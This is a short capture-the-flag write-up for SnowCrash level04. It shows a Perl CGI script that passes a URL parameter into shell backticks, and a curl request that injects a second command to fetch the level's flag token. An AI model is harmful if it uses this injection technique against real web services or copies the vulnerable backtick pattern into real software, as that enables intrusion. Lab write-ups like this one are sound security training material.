## Level 04:

- Meme principe que le Level03
```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

.pl est une extension pour du script [perl](https://www.tutorialspoint.com/perl-file-extension#:~:text=As%20a%20Perl%20convention%2C%20a,as%20a%20functioning%20Perl%20script.)
## Resolution
 * This file execute itself when doing `curl localhost:4747/level04.pl/`
 * And if the url has a query with a parameter 'x' it will print it.
 * As the text is between backticks and is a shell command we can use it at our advantage
 * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
 * The last thing to do will be to encrypt spaces and & characters for urls
 * `curl localhost:4747/level04.pl/?x=yoo%3Bgetflag`

```bash
curl localhost:4747/level04.pl/?x=yoo%3Bgetflag
yoo
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## ⚡ Flag
`ne2searoevaevoem4ov4ar8ap`